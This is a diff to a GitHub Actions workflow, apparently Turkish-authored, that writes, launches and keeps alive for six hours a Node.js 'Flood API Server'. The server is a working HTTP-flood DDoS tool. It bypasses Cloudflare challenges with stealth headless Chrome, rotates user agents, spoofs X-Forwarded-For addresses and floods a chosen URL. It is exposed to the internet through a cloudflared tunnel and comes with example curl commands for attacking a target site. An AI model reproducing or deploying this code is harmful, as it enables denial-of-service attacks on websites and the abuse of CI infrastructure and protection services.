@@ -25,386 +25,360 @@ jobs:
         npm install -g pm2
     
     - name: Create Server File
+      shell: powershell
       run: |
         New-Item -ItemType Directory -Force -Path "C:\flood-api"
         
-        @"
-const express = require('express');
-const http = require('http');
-const https = require('https');
-const cluster = require('cluster');
-const os = require('os');
-const crypto = require('crypto');
-const urlModule = require('url');
-const puppeteer = require('puppeteer-extra');
-const StealthPlugin = require('puppeteer-extra-plugin-stealth');
-const cors = require('cors');
+        $serverCode = @'
+        const express = require('express');
+        const http = require('http');
+        const https = require('https');
+        const cluster = require('cluster');
+        const os = require('os');
+        const crypto = require('crypto');
+        const urlModule = require('url');
+        const puppeteer = require('puppeteer-extra');
+        const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+        const cors = require('cors');
 
-puppeteer.use(StealthPlugin());
+        puppeteer.use(StealthPlugin());
 
-// Global optimizasyonlar
-process.setMaxListeners(0);
-process.env.UV_THREADPOOL_SIZE = 128;
+        process.setMaxListeners(0);
+        process.env.UV_THREADPOOL_SIZE = 128;
 
-const app = express();
-app.use(cors());
-app.use(express.json());
+        const app = express();
+        app.use(cors());
+        app.use(express.json());
 
-let attackStatus = {
-    running: false,
-    target: null,
-    workers: 0,
-    totalRequests: 0,
-    startTime: null,
-    rps: 0,
-    success: 0,
-    fail: 0
-};
+        let attackStatus = {
+            running: false,
+            target: null,
+            workers: 0,
+            totalRequests: 0,
+            startTime: null,
+            rps: 0,
+            success: 0,
+            fail: 0
+        };
 
-let attackInterval = null;
-let workerProcesses = [];
-let statsInterval = null;
+        let cfClearance = null;
+        let browser = null;
 
-// ============ CLOUDFLARE BYPASS ============
-let cfClearance = null;
-let browser = null;
-
-async function getCloudflareBypass(url) {
-    try {
-        if (browser) {
-            try { await browser.close(); } catch(e) {}
+        async function getCloudflareBypass(url) {
+            try {
+                if (browser) {
+                    try { await browser.close(); } catch(e) {}
+                }
+                
+                browser = await puppeteer.launch({
+                    headless: 'new',
+                    args: [
+                        '--no-sandbox',
+                        '--disable-setuid-sandbox',
+                        '--disable-blink-features=AutomationControlled',
+                        '--disable-dev-shm-usage',
+                        '--disable-web-security',
+                        '--disable-gpu',
+                        '--disable-accelerated-2d-canvas',
+                        '--disable-background-timer-throttling',
+                        '--disable-backgrounding-occluded-windows',
+                        '--disable-breakpad',
+                        '--disable-component-extensions-with-background-pages',
+                        '--disable-default-apps',
+                        '--disable-extensions',
+                        '--disable-hang-monitor',
+                        '--disable-ipc-flooding-protection',
+                        '--disable-notifications',
+                        '--disable-popup-blocking',
+                        '--disable-renderer-backgrounding',
+                        '--disable-speech-api',
+                        '--disable-sync',
+                        '--disable-web-resources',
+                        '--enable-automation=false',
+                        '--mute-audio',
+                        '--no-default-browser-check',
+                        '--no-first-run',
+                        '--no-sandbox',
+                        '--single-process',
+                        '--window-size=1920,1080'
+                    ],
+                    defaultViewport: { width: 1920, height: 1080 }
+                });
+                
+                const page = await browser.newPage();
+                await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36');
+                
+                await page.goto(url, {
+                    waitUntil: 'networkidle2',
+                    timeout: 30000
+                });
+                
+                const pageContent = await page.content();
+                const isChallenge = pageContent.includes('cf-challenge') || 
+                                   pageContent.includes('cloudflare') && 
+                                   (pageContent.includes('challenge') || pageContent.includes('security'));
+                
+                if (isChallenge) {
+                    await page.waitForFunction(
+                        () => {
+                            const body = document.body.innerText;
+                            return !body.includes('cf-challenge') && 
+                                   !body.includes('Checking your browser') &&
+                                   !body.includes('Please wait') &&
+                                   !body.includes('Just a moment');
+                        },
+                        { timeout: 60000, polling: 1000 }
+                    );
+                }
+                
+                const cookies = await page.cookies();
+                for (const cookie of cookies) {
+                    if (cookie.name === 'cf_clearance') {
+                        cfClearance = cookie.value;
+                        break;
+                    }
+                }
+                
+                await page.close();
+                return true;
+                
+            } catch (error) {
+                console.error('CF Bypass Error:', error.message);
+                return false;
+            }
         }
-        
-        browser = await puppeteer.launch({
-            headless: 'new',
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--disable-blink-features=AutomationControlled',
-                '--disable-dev-shm-usage',
-                '--disable-web-security',
-                '--disable-gpu',
-                '--disable-accelerated-2d-canvas',
-                '--disable-background-timer-throttling',
-                '--disable-backgrounding-occluded-windows',
-                '--disable-breakpad',
-                '--disable-component-extensions-with-background-pages',
-                '--disable-default-apps',
-                '--disable-extensions',
-                '--disable-hang-monitor',
-                '--disable-ipc-flooding-protection',
-                '--disable-notifications',
-                '--disable-popup-blocking',
-                '--disable-renderer-backgrounding',
-                '--disable-speech-api',
-                '--disable-sync',
-                '--disable-web-resources',
-                '--enable-automation=false',
-                '--mute-audio',
-                '--no-default-browser-check',
-                '--no-first-run',
-                '--no-sandbox',
-                '--single-process',
-                '--window-size=1920,1080'
-            ],
-            defaultViewport: { width: 1920, height: 1080 }
+
+        function createWorker(targetUrl, powerLevel, workerId) {
+            const parsedUrl = urlModule.parse(targetUrl);
+            const isHttps = targetUrl.startsWith('https');
+            const hostname = parsedUrl.hostname;
+            const port = parsedUrl.port || (isHttps ? 443 : 80);
+            const basePath = parsedUrl.path || '/';
+            
+            let successCount = 0;
+            let failCount = 0;
+            
+            const userAgents = [];
+            for (let i = 0; i < 30; i++) {
+                userAgents.push(
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/' + (Math.floor(Math.random() * 21 + 100)) + '.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:' + (Math.floor(Math.random() * 22 + 100)) + '.0) Gecko/20100101 Firefox/' + (Math.floor(Math.random() * 22 + 100)) + '.0',
+                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_' + (Math.floor(Math.random() * 5)) + ') AppleWebKit/605.1.15 Version/17.' + (Math.floor(Math.random() * 5)) + ' Safari/605.1.15'
+                );
+            }
+            
+            const referers = [
+                'https://www.google.com/',
+                'https://www.bing.com/',
+                'https://www.yandex.com/',
+                'https://duckduckgo.com/',
+                'https://twitter.com/',
+                'https://www.facebook.com/'
+            ];
+            
+            function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+            function randomString(len) { return crypto.randomBytes(len).toString('hex'); }
+            function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+            
+            function generatePath() {
+                let path = basePath;
+                if (!path.endsWith('/')) path += '/';
+                path += '?' + randomString(8) + '=' + Date.now() + '&r=' + randomString(6);
+                return path;
+            }
+            
+            function createHeaders() {
+                const headers = {
+                    'Host': hostname,
+                    'User-Agent': randomElement(userAgents),
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Referer': randomElement(referers),
+                    'Cache-Control': 'no-cache, no-store, must-revalidate',
+                    'X-Forwarded-For': randomInt(1,255) + '.' + randomInt(0,255) + '.' + randomInt(0,255) + '.' + randomInt(1,254),
+                    'X-Real-IP': randomInt(1,255) + '.' + randomInt(0,255) + '.' + randomInt(0,255) + '.' + randomInt(1,254),
+                    'Connection': 'keep-alive'
+                };
+                
+                if (cfClearance) {
+                    headers['Cookie'] = 'cf_clearance=' + cfClearance;
+                }
+                
+                return headers;
+            }
+            
+            function sendRequest() {
+                const options = {
+                    hostname: hostname,
+                    port: port,
+                    path: generatePath(),
+                    method: Math.random() > 0.5 ? 'GET' : 'POST',
+                    headers: createHeaders(),
+                    timeout: 2000,
+                    family: 4
+                };
+                
+                const httpModule = isHttps ? https : http;
+                const req = httpModule.request(options, (res) => {
+                    res.resume();
+                    if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 503) {
+                        successCount++;
+                    } else {
+                        failCount++;
+                    }
+                });
+                
+                req.setNoDelay(true);
+                req.on('error', () => failCount++);
+                req.on('timeout', () => { req.destroy(); failCount++; });
+                req.end();
+            }
+            
+            let activeRequests = 0;
+            const MAX_CONCURRENT = powerLevel;
+            
+            function flood() {
+                const batchSize = Math.min(50, MAX_CONCURRENT);
+                for (let i = 0; i < batchSize; i++) {
+                    if (activeRequests < MAX_CONCURRENT) {
+                        activeRequests++;
+                        sendRequest();
+                        setTimeout(() => activeRequests--, 10);
+                    }
+                }
+                setImmediate(flood);
+            }
+            
+            flood();
+            
+            let lastSuccess = 0;
+            let lastFail = 0;
+            
+            setInterval(() => {
+                const newSuccess = successCount - lastSuccess;
+                const newFail = failCount - lastFail;
+                if (newSuccess > 0 || newFail > 0) {
+                    attackStatus.success += newSuccess;
+                    attackStatus.fail += newFail;
+                    attackStatus.totalRequests += newSuccess + newFail;
+                    attackStatus.rps = newSuccess + newFail;
+                    lastSuccess = successCount;
+                    lastFail = failCount;
+                }
+            }, 1000);
+        }
+
+        app.get('/attack', async (req, res) => {
+            const url = req.query.url;
+            const concurrent = parseInt(req.query.concurrent) || 200;
+            const threads = parseInt(req.query.threads) || os.cpus().length;
+
+            if (!url) {
+                return res.status(400).json({ 
+                    error: 'URL gerekli! Ornek: /attack?url=https://example.com&concurrent=200' 
+                });
+            }
+
+            if (attackStatus.running) {
+                return res.status(400).json({ 
+                    error: 'Zaten aktif saldiri var! /stop ile durdur' 
+                });
+            }
+
+            console.log('🚀 Attack started on ' + url + ' with ' + concurrent + ' concurrent, ' + threads + ' threads');
+            
+            attackStatus = {
+                running: true,
+                target: url,
+                workers: threads,
+                totalRequests: 0,
+                startTime: Date.now(),
+                rps: 0,
+                success: 0,
+                fail: 0
+            };
+
+            await getCloudflareBypass(url);
+            
+            setInterval(async () => {
+                await getCloudflareBypass(url);
+            }, 30000);
+
+            for (let i = 0; i < threads; i++) {
+                setTimeout(() => {
+                    createWorker(url, concurrent, i);
+                }, i * 100);
+            }
+
+            res.json({
+                status: 'Attack started',
+                target: url,
+                threads: threads,
+                concurrent: concurrent,
+                message: 'GET /status ile durumu kontrol edin'
+            });
         });
-        
-        const page = await browser.newPage();
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36');
-        
-        await page.goto(url, {
-            waitUntil: 'networkidle2',
-            timeout: 30000
+
+        app.get('/status', (req, res) => {
+            const uptime = attackStatus.startTime ? 
+                Math.floor((Date.now() - attackStatus.startTime) / 1000) : 0;
+            
+            res.json({
+                running: attackStatus.running,
+                target: attackStatus.target,
+                workers: attackStatus.workers,
+                totalRequests: attackStatus.totalRequests,
+                success: attackStatus.success,
+                fail: attackStatus.fail,
+                rps: attackStatus.rps,
+                uptime: uptime + 's',
+                cfBypassed: cfClearance ? true : false
+            });
         });
-        
-        const pageContent = await page.content();
-        const isChallenge = pageContent.includes('cf-challenge') || 
-                           pageContent.includes('cloudflare') && 
-                           (pageContent.includes('challenge') || pageContent.includes('security'));
-        
-        if (isChallenge) {
-            await page.waitForFunction(
-                () => {
-                    const body = document.body.innerText;
-                    return !body.includes('cf-challenge') && 
-                           !body.includes('Checking your browser') &&
-                           !body.includes('Please wait') &&
-                           !body.includes('Just a moment');
+
+        app.get('/stop', (req, res) => {
+            attackStatus.running = false;
+            attackStatus = {
+                running: false,
+                target: null,
+                workers: 0,
+                totalRequests: 0,
+                startTime: null,
+                rps: 0,
+                success: 0,
+                fail: 0
+            };
+            cfClearance = null;
+            
+            console.log('⛔ Attack stopped');
+            res.json({
+                status: 'Attack stopped',
+                message: 'Tum islemler durduruldu'
+            });
+        });
+
+        app.get('/', (req, res) => {
+            res.json({
+                name: 'Flood API Server',
+                version: '1.0.0',
+                endpoints: {
+                    attack: '/attack?url=https://example.com&concurrent=200',
+                    stop: '/stop',
+                    status: '/status'
                 },
-                { timeout: 60000, polling: 1000 }
-            );
-        }
-        
-        const cookies = await page.cookies();
-        for (const cookie of cookies) {
-            if (cookie.name === 'cf_clearance') {
-                cfClearance = cookie.value;
-                break;
-            }
-        }
-        
-        await page.close();
-        return true;
-        
-    } catch (error) {
-        console.error('CF Bypass Error:', error.message);
-        return false;
-    }
-}
-
-// ============ FLOOD WORKER ============
-function createWorker(targetUrl, powerLevel, workerId) {
-    const parsedUrl = urlModule.parse(targetUrl);
-    const isHttps = targetUrl.startsWith('https');
-    const hostname = parsedUrl.hostname;
-    const port = parsedUrl.port || (isHttps ? 443 : 80);
-    const basePath = parsedUrl.path || '/';
-    
-    let successCount = 0;
-    let failCount = 0;
-    
-    // User Agents
-    const userAgents = [];
-    for (let i = 0; i < 30; i++) {
-        userAgents.push(
-            `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/${Math.floor(Math.random() * 21 + 100)}.0.0.0 Safari/537.36`,
-            `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(Math.random() * 22 + 100)}.0) Gecko/20100101 Firefox/${Math.floor(Math.random() * 22 + 100)}.0`,
-            `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_${Math.floor(Math.random() * 5)}) AppleWebKit/605.1.15 Version/17.${Math.floor(Math.random() * 5)} Safari/605.1.15`
-        );
-    }
-    
-    const referers = [
-        'https://www.google.com/',
-        'https://www.bing.com/',
-        'https://www.yandex.com/',
-        'https://duckduckgo.com/',
-        'https://twitter.com/',
-        'https://www.facebook.com/'
-    ];
-    
-    function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
-    function randomString(len) { return crypto.randomBytes(len).toString('hex'); }
-    function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
-    
-    function generatePath() {
-        let path = basePath;
-        if (!path.endsWith('/')) path += '/';
-        path += `?${randomString(8)}=${Date.now()}&r=${randomString(6)}`;
-        return path;
-    }
-    
-    function createHeaders() {
-        const headers = {
-            'Host': hostname,
-            'User-Agent': randomElement(userAgents),
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': randomElement(referers),
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'X-Forwarded-For': `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`,
-            'X-Real-IP': `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`,
-            'Connection': 'keep-alive'
-        };
-        
-        if (cfClearance) {
-            headers['Cookie'] = `cf_clearance=${cfClearance}`;
-        }
-        
-        return headers;
-    }
-    
-    function sendRequest() {
-        const options = {
-            hostname: hostname,
-            port: port,
-            path: generatePath(),
-            method: Math.random() > 0.5 ? 'GET' : 'POST',
-            headers: createHeaders(),
-            timeout: 2000,
-            family: 4
-        };
-        
-        const httpModule = isHttps ? https : http;
-        const req = httpModule.request(options, (res) => {
-            res.resume();
-            if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 503) {
-                successCount++;
-            } else {
-                failCount++;
-            }
+                docs: 'GET request ile kullanin'
+            });
         });
-        
-        req.setNoDelay(true);
-        req.on('error', () => failCount++);
-        req.on('timeout', () => { req.destroy(); failCount++; });
-        req.end();
-    }
-    
-    // Flood loop
-    let activeRequests = 0;
-    const MAX_CONCURRENT = powerLevel;
-    let requestCount = 0;
-    
-    function flood() {
-        const batchSize = Math.min(50, MAX_CONCURRENT);
-        for (let i = 0; i < batchSize; i++) {
-            if (activeRequests < MAX_CONCURRENT) {
-                activeRequests++;
-                sendRequest();
-                setTimeout(() => activeRequests--, 10);
-                requestCount++;
-            }
-        }
-        setImmediate(flood);
-    }
-    
-    flood();
-    
-    // İstatistikleri her saniye gönder
-    let lastSuccess = 0;
-    let lastFail = 0;
-    
-    setInterval(() => {
-        const newSuccess = successCount - lastSuccess;
-        const newFail = failCount - lastFail;
-        if (newSuccess > 0 || newFail > 0) {
-            attackStatus.success += newSuccess;
-            attackStatus.fail += newFail;
-            attackStatus.totalRequests += newSuccess + newFail;
-            attackStatus.rps = newSuccess + newFail;
-            lastSuccess = successCount;
-            lastFail = failCount;
-        }
-    }, 1000);
-}
 
-// ============ API ENDPOINTS ============
-
-// Attack başlat
-app.get('/attack', async (req, res) => {
-    const url = req.query.url;
-    const concurrent = parseInt(req.query.concurrent) || 200;
-    const threads = parseInt(req.query.threads) || os.cpus().length;
-
-    if (!url) {
-        return res.status(400).json({ 
-            error: 'URL gerekli! Örnek: /attack?url=https://example.com&concurrent=200' 
+        const PORT = 3000;
+        app.listen(PORT, '0.0.0.0', () => {
+            console.log('✅ Flood API Server running on port ' + PORT);
+            console.log('📡 Local: http://localhost:' + PORT);
         });
-    }
 
-    if (attackStatus.running) {
-        return res.status(400).json({ 
-            error: 'Zaten aktif saldırı var! /stop ile durdur' 
-        });
-    }
-
-    console.log(`🚀 Attack started on ${url} with ${concurrent} concurrent, ${threads} threads`);
-    
-    // Reset stats
-    attackStatus = {
-        running: true,
-        target: url,
-        workers: threads,
-        totalRequests: 0,
-        startTime: Date.now(),
-        rps: 0,
-        success: 0,
-        fail: 0
-    };
-
-    // Cloudflare bypass
-    await getCloudflareBypass(url);
-    
-    // CF yenileme
-    setInterval(async () => {
-        await getCloudflareBypass(url);
-    }, 30000);
-
-    // Worker'ları başlat
-    for (let i = 0; i < threads; i++) {
-        setTimeout(() => {
-            createWorker(url, concurrent, i);
-        }, i * 100);
-    }
-
-    res.json({
-        status: 'Attack started',
-        target: url,
-        threads: threads,
-        concurrent: concurrent,
-        message: 'GET /status ile durumu kontrol edin'
-    });
-});
-
-// Status kontrol
-app.get('/status', (req, res) => {
-    const uptime = attackStatus.startTime ? 
-        Math.floor((Date.now() - attackStatus.startTime) / 1000) : 0;
-    
-    res.json({
-        running: attackStatus.running,
-        target: attackStatus.target,
-        workers: attackStatus.workers,
-        totalRequests: attackStatus.totalRequests,
-        success: attackStatus.success,
-        fail: attackStatus.fail,
-        rps: attackStatus.rps,
-        uptime: uptime + 's',
-        cfBypassed: cfClearance ? true : false
-    });
-});
-
-// Attack durdur
-app.get('/stop', (req, res) => {
-    attackStatus.running = false;
-    attackStatus = {
-        running: false,
-        target: null,
-        workers: 0,
-        totalRequests: 0,
-        startTime: null,
-        rps: 0,
-        success: 0,
-        fail: 0
-    };
-    cfClearance = null;
-    
-    console.log('⛔ Attack stopped');
-    res.json({
-        status: 'Attack stopped',
-        message: 'Tüm işlemler durduruldu'
-    });
-});
-
-// Ana sayfa
-app.get('/', (req, res) => {
-    res.json({
-        name: 'Flood API Server',
-        version: '1.0.0',
-        endpoints: {
-            attack: '/attack?url=https://example.com&concurrent=200',
-            stop: '/stop',
-            status: '/status'
-        },
-        docs: 'GET request ile kullanın'
-    });
-});
-
-// ============ SERVER START ============
-const PORT = 3000;
-const server = app.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Flood API Server running on port ${PORT}`);
-    console.log(`📡 Local: http://localhost:${PORT}`);
-    console.log(`🔧 Endpoints:`);
-    console.log(`   - GET /attack?url=URL&concurrent=NUMBER`);
-    console.log(`   - GET /stop`);
-    console.log(`   - GET /status`);
-});
-
-module.exports = app;
-"@ | Out-File -FilePath "C:\flood-api\server.js" -Encoding UTF8
+        module.exports = app;
+        '@ | Out-File -FilePath "C:\flood-api\server.js" -Encoding UTF8
 
     - name: Start Server with PM2
       run: |
@@ -412,26 +386,19 @@ module.exports = app;
         pm2 start server.js --name flood-api
         pm2 save
         pm2 list
-        
-        # PM2 logs
         Start-Sleep -Seconds 5
         pm2 logs flood-api --lines 20 --nostream
 
     - name: Download and Install Cloudflared
       run: |
-        # Cloudflared indir
         Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
         Move-Item -Path ".\cloudflared.exe" -Destination "C:\cloudflared.exe" -Force
     
     - name: Start Cloudflared Tunnel
       run: |
-        # Cloudflared tunnel başlat
         Start-Process -FilePath "C:\cloudflared.exe" -ArgumentList "tunnel --url http://localhost:3000" -WindowStyle Hidden -RedirectStandardOutput "C:\cloudflared.log" -RedirectStandardError "C:\cloudflared-error.log"
-        
-        # Tunnel URL'sini bul
         Start-Sleep -Seconds 10
         
-        # Cloudflared log'dan URL'yi al
         $logContent = Get-Content "C:\cloudflared.log" -ErrorAction SilentlyContinue
         $tunnelUrl = ($logContent | Select-String -Pattern "https://[a-zA-Z0-9-]+\.trycloudflare\.com" | ForEach-Object { $_.Matches.Value }) | Select-Object -First 1
         
@@ -448,11 +415,11 @@ module.exports = app;
             Write-Host "   ${tunnelUrl}/stop" -ForegroundColor White
             Write-Host "   ${tunnelUrl}/status" -ForegroundColor White
             Write-Host ""
-            Write-Host "💡 Örnek Kullanım:" -ForegroundColor Green
+            Write-Host "💡 Ornek Kullanim:" -ForegroundColor Green
             Write-Host "   curl ${tunnelUrl}/attack?url=https://hedefsite.com&concurrent=300" -ForegroundColor Gray
             Write-Host "   curl ${tunnelUrl}/status" -ForegroundColor Gray
         } else {
-            Write-Host "⚠️ Cloudflared log okunamadı, manuel kontrol:" -ForegroundColor Red
+            Write-Host "⚠️ Cloudflared log okunamadi, manuel kontrol:" -ForegroundColor Red
             Write-Host "   Get-Content C:\cloudflared.log" -ForegroundColor Gray
         }
         Write-Host ""
@@ -462,17 +429,18 @@ module.exports = app;
     
     - name: Keep Server Alive
       run: |
-        Write-Host "🔄 Server aktif, 6 saat boyunca çalışacak..."
+        Write-Host "🔄 Server aktif, 6 saat boyunca calisacak..."
         Write-Host "📊 PM2 status:"
         pm2 list
         
-        # Sürekli çalıştır
-        $timeout = 21600 # 6 saat
+        $timeout = 21600
         $elapsed = 0
         while ($elapsed -lt $timeout) {
-            $status = Invoke-RestMethod -Uri "http://localhost:3000/status" -ErrorAction SilentlyContinue
-            if ($status) {
+            try {
+                $status = Invoke-RestMethod -Uri "http://localhost:3000/status" -ErrorAction Stop
                 Write-Host "`n📊 Status: Running=$($status.running) | RPS=$($status.rps) | Total=$($status.totalRequests)" -ForegroundColor Green
+            } catch {
+                Write-Host "`n⚠️ Status check failed" -ForegroundColor Yellow
             }
             Start-Sleep -Seconds 10
             $elapsed += 10
